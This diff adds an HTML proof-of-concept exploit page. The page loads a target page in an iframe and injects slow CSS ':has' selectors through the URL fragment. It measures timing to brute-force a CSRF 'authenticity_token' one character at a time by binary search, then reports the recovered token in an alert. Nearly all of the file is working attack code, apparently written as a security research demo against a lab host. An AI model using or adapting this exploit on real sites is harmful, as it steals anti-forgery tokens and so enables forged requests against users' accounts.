@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script>
+            const WAIT_TIME = 6;
+            const VICTIM_URL = "https://labs.sheddow.xyz/fsf.html";
+
+            const wait = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+            function get_execution_time(selector) {
+                var t0 = window.performance.now();
+
+                var p = wait(WAIT_TIME).then(_ => Promise.resolve(measure_time(t0)))
+
+                window.frames[0].location = VICTIM_URL + "#x," + encodeURIComponent(selector) + ","+Math.random();
+                
+                return p;
+            }
+
+            function measure_time(t0) {
+                var t = window.performance.now() - t0;
+                return t;
+            }
+
+
+            const SLOW_SELECTOR = "*:has(*:has(*) *:has(*) *:has(*) *:has(*))";
+            const SELECTOR_TEMPLATE = "input[name=authenticity_token][value^='{}']";
+
+            async function binary_search(prefix, characters) {
+                console.log("Testing '" + characters + "'");
+                if (characters.length == 1) {
+                    return characters[0];
+                }
+
+                var mid = Math.floor(characters.length/2);
+                var s1 = make_selector(prefix, characters.slice(0, mid));
+                var s2 = make_selector(prefix, characters.slice(mid, characters.length));
+
+                var t1 = await get_execution_time(s1);
+                var t2 = await get_execution_time(s2);
+
+                if (approximately_equal(t1, t2)) {
+                    return null;
+                }
+                else if (t1 < t2) {
+                    return binary_search(prefix, characters.slice(mid, characters.length));
+                }
+                else {
+                    return binary_search(prefix, characters.slice(0, mid));
+                }
+            }
+
+            function make_selector(prefix, characters) {
+                return characters
+                    .split("")
+                    .map(c => SLOW_SELECTOR + " " + SELECTOR_TEMPLATE.replace("{}", prefix + c))
+                    .join(",");
+            }
+
+            function approximately_equal(t1, t2) {
+                var diff = Math.abs(t1 - t2);
+                return diff <= 0.2*t1 || diff <= 0.2*t2;
+            }
+
+            const BASE64_CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/";
+            const TOKEN_LENGTH = 43;
+
+            async function bruteforce_token() {
+                var backtracks = 0;
+                var t0 = window.performance.now();
+                var misses = 0;
+                var token = "";
+                while (token.length < TOKEN_LENGTH) {
+                    var c = await binary_search(token, BASE64_CHARS);
+                    if (c === null) {
+                        misses++;
+                        if (misses == 3) {
+                            token = token.slice(0, -1); // Backtrack
+                            backtracks++;
+                        }
+                    }
+                    else {
+                        token += c;
+                        misses = 0;
+                    }
+                    document.getElementById("token").innerHTML = token;
+                    document.getElementById("percent").innerHTML = Math.round(100*token.length/TOKEN_LENGTH) + "%";
+                }
+                token += "=";
+                document.getElementById("token").innerHTML = token;
+                var elapsed = window.performance.now() - t0;
+                return {token, elapsed, backtracks};
+            }
+
+            window.onload = function() {
+                if (location.search === "?attack") {
+                    bruteforce_token().then(({token, elapsed, backtracks}) => {
+                        wait(0).then(_ => alert("Found " + token + " in " + elapsed/1000 + " seconds with " + backtracks + " backtracks"));
+                    });
+                }
+            }
+        </script>
+
+        <style>
+.box {
+    margin: 5px;
+    background: rgba(20, 20, 20, 0.8);
+    color: #ddd;
+    padding: 2px;
+    border-radius: 5px;
+}
+#token {
+    position: fixed;
+    bottom: 2px;
+    left 2px;
+}
+#percent {
+    position: fixed;
+    bottom: 2px;
+    right: 2px;
+}
+        </style>
+    </head>
+
+    <body>
+        <iframe src="https://labs.sheddow.xyz/fsf.html"></iframe>
+        <div class="box" id="token"></div>
+        <div class="box" id="percent"></div>
+    </body>
+</html>
